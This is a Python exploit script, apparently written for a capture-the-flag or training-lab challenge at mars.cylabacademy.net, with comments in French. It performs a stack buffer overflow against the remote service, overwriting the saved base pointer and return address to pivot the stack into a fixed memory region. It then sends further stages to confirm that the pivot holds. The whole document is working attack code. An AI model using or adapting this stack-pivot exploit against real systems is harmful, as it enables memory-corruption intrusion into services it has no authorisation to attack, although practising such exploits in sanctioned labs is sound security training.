import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_SEQ = 0x400b6f
STAGE = 0x602900


def p64(x):
    return struct.pack("<Q", x)


s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(4)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
# 32 filler + saved rbp = STAGE + ret = read_seq
s.sendall(b"A" * 32 + p64(STAGE) + p64(READ_SEQ))
time.sleep(0.5)
# stage 2 : ecrit a STAGE-0x20 ; repivote vers 0x602980
s.sendall(b"B" * 0x20 + p64(0x602980) + p64(READ_SEQ))
time.sleep(0.6)
out = b""
closed = False
try:
    while True:
        c = s.recv(4096)
        if not c:
            closed = True
            break
        out += c
except socket.timeout:
    pass
except Exception:
    closed = True
print("sortie:", len(out), "ferme:", closed)
print("extrait:", repr(out[:250]))
print("=> PIVOT:", "OK" if not closed else "echec")
if not closed:
    # 3e stage pour confirmer
    try:
        s.sendall(b"C" * 0x20 + p64(0x602A00) + p64(READ_SEQ))
        time.sleep(0.5)
        print("3e envoi accepte -> pivot profond OK")
    except Exception as e:
        print("3e envoi echoue:", type(e).__name__)
s.close()
